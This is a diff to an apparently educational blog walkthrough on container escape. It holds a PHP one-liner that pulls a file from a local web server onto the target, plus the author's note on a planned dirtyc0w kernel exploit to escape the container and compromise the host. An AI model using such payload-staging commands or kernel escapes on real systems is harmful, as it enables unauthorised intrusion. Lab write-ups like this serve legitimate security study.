@@ -115,9 +115,10 @@ php -r 'file_put_contents("test", file_get_contents("http://192.168.1.20/test"))
 
 I created a file called test on my web server and echo'ed hello into it so it had something we can see work, and voila! It transfers.
 
-![PHP Download]({{site.url}}/images/phpdownload.png){: .center-image }
+![PHP Download]({{site.url}}/images/phpdownloads.png){: .center-image }
 
 So now that we can move files to and from our server, we need to figure out how to get our exploit there. We don't have gcc available, which makes this difficult. 
 
-----to be continued....---
 
+**The plan originally was to use a dirtyc0w exploit on the container and get an escape. I want a scenario that's not completely artificial but at the same time reproducible, so I need to plan this some more. The short of it all is, you can use kernel exploits to escape container space and compromise the host. More on this later. I started some courses from udemy and they're taking up enough of my time where I don't want to stop adding content to give myself enough time to figure out how to write this scenario properly AND still get something done with my studies. I'll be updating this soon**
+----to be continued....---
